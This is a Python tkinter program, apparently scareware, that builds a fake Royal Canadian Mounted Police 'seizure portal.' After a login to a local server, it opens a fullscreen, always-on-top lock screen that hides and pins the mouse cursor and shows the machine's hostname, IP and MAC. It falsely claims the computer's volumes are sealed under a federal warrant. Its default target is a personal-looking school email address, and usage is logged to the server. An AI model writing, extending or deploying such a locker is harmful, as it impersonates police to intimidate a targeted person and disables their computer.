import ctypes
import json
import platform
import socket
import sys
import tkinter as tk
from tkinter import messagebox
import urllib.request
import uuid

# Set this to your server address (local for now: http://127.0.0.1:5000)
SERVER_URL = "http://127.0.0.1:5000"


class AuthWindow:

  def __init__(self):
    self.root = tk.Tk()
    self.root.title("KERNEL // Authentication")
    self.root.geometry("400x320")
    self.root.configure(bg="#09090f")
    self.root.resizable(False, False)

    # Center window
    sw = self.root.winfo_screenwidth()
    sh = self.root.winfo_screenheight()
    self.root.geometry(f"400x320+{(sw-400)//2}+{(sh-320)//2}")

    self.build_ui()
    # Check connection smoothly after UI renders
    self.root.after(500, self.verify_server_status)

  def verify_server_status(self):
    """Checks whether the failure is due to no internet vs server down."""
    # Step 1: Test basic internet connectivity by pinging a reliable external address
    try:
      urllib.request.urlopen("https://www.google.com", timeout=3)
    except Exception:
      messagebox.showerror(
          "Network Error",
          "No internet connection detected.\nPlease check your network settings"
          " and try again.",
      )
      self.root.destroy()
      return

    # Step 2: Internet works, now check if our specific server is responding
    try:
      req = urllib.request.Request(f"{SERVER_URL}/api/logs")
      urllib.request.urlopen(req, timeout=3)
    except Exception:
      messagebox.showerror(
          "Server Offline",
          f"Internet connection is active, but the KERNEL server at\n{SERVER_URL}"
          " is currently offline or unreachable.",
      )
      self.root.destroy()

  def build_ui(self):
    header = tk.Frame(self.root, bg="#121216", padx=15, pady=12)
    header.pack(fill="x", padx=15, pady=(15, 10))
    tk.Label(
        header,
        text="RESTRICTED ACCESS PORTAL",
        font=("Segoe UI", 10, "bold"),
        fg="#c084fc",
        bg="#121216",
    ).pack(anchor="w")

    body = tk.Frame(self.root, bg="#09090f", padx=15)
    body.pack(fill="both", expand=True)

    tk.Label(
        body,
        text="Username:",
        font=("Segoe UI", 9),
        fg="#a78bfa",
        bg="#09090f",
    ).pack(anchor="w")
    self.user_entry = tk.Entry(
        body,
        font=("Segoe UI", 10),
        bg="#18181c",
        fg="#f3f4f6",
        insertbackground="#c084fc",
        relief="flat",
    )
    self.user_entry.pack(fill="x", ipady=4, pady=(2, 10))

    tk.Label(
        body,
        text="Password:",
        font=("Segoe UI", 9),
        fg="#a78bfa",
        bg="#09090f",
    ).pack(anchor="w")
    self.pass_entry = tk.Entry(
        body,
        show="*",
        font=("Segoe UI", 10),
        bg="#18181c",
        fg="#f3f4f6",
        insertbackground="#c084fc",
        relief="flat",
    )
    self.pass_entry.pack(fill="x", ipady=4, pady=(2, 15))

    btn_frame = tk.Frame(body, bg="#09090f")
    btn_frame.pack(fill="x")

    tk.Button(
        btn_frame,
        text="LOGIN",
        bg="#7c3aed",
        fg="white",
        font=("Segoe UI", 9, "bold"),
        relief="flat",
        command=lambda: self.authenticate("login"),
    ).pack(side="left", fill="x", expand=True, padx=(0, 5), ipady=5)
    tk.Button(
        btn_frame,
        text="SIGNUP",
        bg="#27272a",
        fg="white",
        font=("Segoe UI", 9, "bold"),
        relief="flat",
        command=lambda: self.authenticate("signup"),
    ).pack(side="right", fill="x", expand=True, padx=(5, 0), ipady=5)

  def authenticate(self, endpoint):
    username = self.user_entry.get().strip()
    password = self.pass_entry.get().strip()

    if not username or not password:
      messagebox.showerror("Error", "Fields cannot be empty.")
      return

    payload = json.dumps({"username": username, "password": password}).encode(
        "utf-8"
    )
    req = urllib.request.Request(
        f"{SERVER_URL}/api/{endpoint}",
        data=payload,
        headers={"Content-Type": "application/json"},
    )

    try:
      with urllib.request.urlopen(req) as response:
        if endpoint == "login":
          messagebox.showinfo("Success", "Authentication granted.")
          self.root.destroy()
          KernelControlHub(username).run()
        else:
          messagebox.showinfo("Success", "Account created. You can now log in.")
    except urllib.error.HTTPError as e:
      err_msg = json.loads(e.read().decode()).get("error", "Request failed.")
      messagebox.showerror("Authentication Error", err_msg)
    except Exception:
      messagebox.showerror(
          "Connection Error",
          "Could not communicate with the server. Please check your"
          " connection.",
      )

  def run(self):
    self.root.mainloop()


class KernelControlHub:

  def __init__(self, logged_in_user):
    self.logged_in_user = logged_in_user
    self.root = tk.Tk()
    self.root.title("KERNEL")
    self.root.geometry("480x480")
    self.root.configure(bg="#09090f")
    self.root.resizable(False, False)
    self.build_ui()

  def build_ui(self):
    header = tk.Frame(self.root, bg="#121216", padx=20, pady=16)
    header.pack(fill="x", padx=15, pady=(15, 10))

    tk.Label(
        header,
        text=f"WELCOME, {self.logged_in_user.upper()}",
        font=("Segoe UI", 11, "bold"),
        fg="#c084fc",
        bg="#121216",
    ).pack(anchor="w")
    tk.Label(
        header,
        text="Canadian Federal Enforcement Gateway",
        font=("Segoe UI", 8),
        fg="#9ca3af",
        bg="#121216",
    ).pack(anchor="w", pady=(2, 0))

    body = tk.Frame(self.root, bg="#09090f", padx=15, pady=5)
    body.pack(fill="both", expand=True, padx=15)

    def create_card(parent, label_text):
      card = tk.Frame(
          parent,
          bg="#121216",
          padx=15,
          pady=10,
          highlightbackground="#27272a",
          highlightthickness=1,
      )
      card.pack(fill="x", pady=6)
      tk.Label(
          card,
          text=label_text,
          font=("Segoe UI", 8, "bold"),
          fg="#a78bfa",
          bg="#121216",
          anchor="w",
      ).pack(fill="x", pady=(0, 4))
      return card

    card1 = create_card(body, "TARGET PRINCIPAL / USER ID")
    self.target_var = tk.StringVar(value="cmyers0809@bhncdsb.ca")
    tk.Entry(
        card1,
        textvariable=self.target_var,
        font=("Segoe UI", 9),
        bg="#18181c",
        fg="#f3f4f6",
        insertbackground="#c084fc",
        relief="flat",
    ).pack(fill="x", ipady=4)

    card2 = create_card(body, "WARRANT / INCIDENT REFERENCE")
    self.case_var = tk.StringVar(value="WNT-2026-CA-8892")
    tk.Entry(
        card2,
        textvariable=self.case_var,
        font=("Segoe UI", 9),
        bg="#18181c",
        fg="#f3f4f6",
        insertbackground="#c084fc",
        relief="flat",
    ).pack(fill="x", ipady=4)

    footer = tk.Frame(self.root, bg="#09090f", padx=15, pady=12)
    footer.pack(fill="x")

    tk.Button(
        footer,
        text="DEPLOY CANADIAN SEIZURE PORTAL",
        font=("Segoe UI", 10, "bold"),
        fg="#ffffff",
        bg="#7c3aed",
        activebackground="#6d28d9",
        relief="flat",
        cursor="hand2",
        pady=10,
        command=self.launch_portal,
    ).pack(fill="x")

  def launch_portal(self):
    config = {
        "user": self.logged_in_user,
        "target": self.target_var.get().strip() or "cmyers0809@bhncdsb.ca",
        "case_file": self.case_var.get().strip() or "WNT-2026-CA-8892",
    }

    try:
      payload = json.dumps({
          "username": config["user"],
          "target": config["target"],
          "case_file": config["case_file"],
          "ip_address": socket.gethostbyname(socket.gethostname()),
      }).encode("utf-8")
      req = urllib.request.Request(
          f"{SERVER_URL}/api/log",
          data=payload,
          headers={"Content-Type": "application/json"},
      )
      urllib.request.urlopen(req)
    except Exception:
      pass

    self.root.withdraw()
    portal = CyberSeizurePortal(config, on_close=self.show_hub)
    portal.run()

  def show_hub(self):
    try:
      self.root.deiconify()
    except Exception:
      pass

  def run(self):
    self.root.mainloop()


class CyberSeizurePortal:

  def __init__(self, config, on_close=None):
    self.config = config
    self.on_close = on_close
    self.root = tk.Tk()
    self.root.title("KERNEL")
    self.root.attributes("-fullscreen", True, "-topmost", True)
    self.root.configure(bg="#050b14")
    self.set_cursor_visibility(False)

    self.cx = self.root.winfo_screenwidth() // 2
    self.cy = self.root.winfo_screenheight() // 2
    self.telemetry = self.collect_telemetry()

    self.root.bind(
        "<Key>",
        lambda e: e.char in ("=", "+") or e.keysym in ("equal", "plus")
        and self.exit(),
    )
    self.build_ui()
    self.locked = True
    self.loop()

  def set_cursor_visibility(self, visible):
    try:
      ctypes.windll.user32.ShowCursor(visible)
    except Exception:
      pass

  def collect_telemetry(self):
    try:
      h = socket.gethostname()
      ip = socket.gethostbyname(h)
    except Exception:
      h, ip = "UNKNOWN", "127.0.0.1"
    return {
        "hostname": h,
        "local_ip": ip,
        "mac": ":".join(
            [
                f"{(uuid.getnode() >> ele) & 0xff:02x}"
                for ele in range(40, -1, -8)
            ]
        ).upper(),
        "user": self.config["target"],
    }

  def loop(self):
    if self.locked:
      try:
        ctypes.windll.user32.SetCursorPos(self.cx, self.cy)
        self.root.lift()
        self.root.attributes("-topmost", True)
      except Exception:
        pass
      self.root.after(10, self.loop)

  def exit(self):
    self.locked = False
    self.set_cursor_visibility(True)
    self.root.destroy()
    if self.on_close:
      self.on_close()

  def build_ui(self):
    container = tk.Frame(self.root, bg="#050b14")
    container.place(relx=0.5, rely=0.5, anchor="center")

    tk.Label(
        container,
        text=(
            "GOVERNMENT OF CANADA  |  GOUVERNEMENT DU CANADA\nROYAL CANADIAN"
            " MOUNTED POLICE (RCMP NC3)"
        ),
        font=("Arial", 11, "bold"),
        fg="#a0b4c8",
        bg="#050b14",
        justify="left",
    ).pack(anchor="w")
    tk.Frame(container, bg="#8b0000", height=3, width=980).pack(
        fill="x", pady=10
    )

    alert = tk.Frame(container, bg="#140203", padx=20, pady=12)
    alert.pack(fill="x", pady=10)
    tk.Label(
        alert,
        text=(
            "[!] MANDATORY FEDERAL INTERCEPTION NOTICE — DOCKET:"
            f" {self.config['case_file']}"
        ),
        font=("Consolas", 10, "bold"),
        fg="#ff4d4d",
        bg="#140203",
    ).pack(anchor="w")

    content = tk.Frame(container, bg="#091220", padx=25, pady=20)
    content.pack(fill="both", expand=True)

    msg = (
        f"Target Profile: {self.config['user']}\nLogged-in Admin Operator:"
        f" {self.config['user']}\nHostname: {self.telemetry['hostname']} | IP:"
        f" {self.telemetry['local_ip']} | MAC: {self.telemetry['mac']}\n\nSystem"
        " access revoked pursuant to Section 487 Criminal Code of Canada.\nAll"
        " local volumes cryptographically sealed under multi-agency warrant."
    )
    tk.Label(
        content,
        text=msg,
        font=("Consolas", 10),
        fg="#e0e6ed",
        bg="#091220",
        justify="left",
    ).pack(anchor="w")

  def run(self):
    self.root.mainloop()


if __name__ == "__main__":
  AuthWindow().run()